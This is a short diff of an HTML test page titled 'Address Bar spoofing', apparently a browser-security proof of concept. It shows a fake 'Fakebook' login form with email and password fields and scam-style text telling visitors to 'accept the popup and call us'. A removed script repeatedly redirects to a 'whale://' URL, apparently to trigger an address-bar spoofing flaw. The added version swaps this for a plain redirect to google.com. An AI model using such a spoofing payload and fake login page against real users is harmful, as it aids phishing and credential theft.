@@ -1,16 +1,23 @@
-<html>
-<title>Address Bar spoofing </title>
-<h1> This is Fakebook </h1>
-<title>testing </title>
-<h1> This is Fakebook please acept the popup nd call us  </h1>
-<form>
-Email: <input type="text" name="username" placeholder="add email"><br>
-Password: <input type="text" name="password" placeholder="pass">
-<script>
-function f()
-{
-location ="whale://test.shhnjk.com/alert.html"
-}
-setInterval("f()", 5);
-  </script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Address Bar Spoofing Example</title>
+    <script>
+        function redirect() {
+            window.location.href = "https://www.google.com";
+        }
+        
+        setTimeout(redirect, 5000); // 5000 milliseconds = 5 seconds
+    </script>
+</head>
+<body>
+    <h1>This is Fakebook</h1>
+    <h2>Please accept the popup and call us</h2>
+    <form>
+        Email: <input type="text" name="username" placeholder="Enter email"><br>
+        Password: <input type="password" name="password" placeholder="Enter password">
+    </form>
+</body>
 </html>
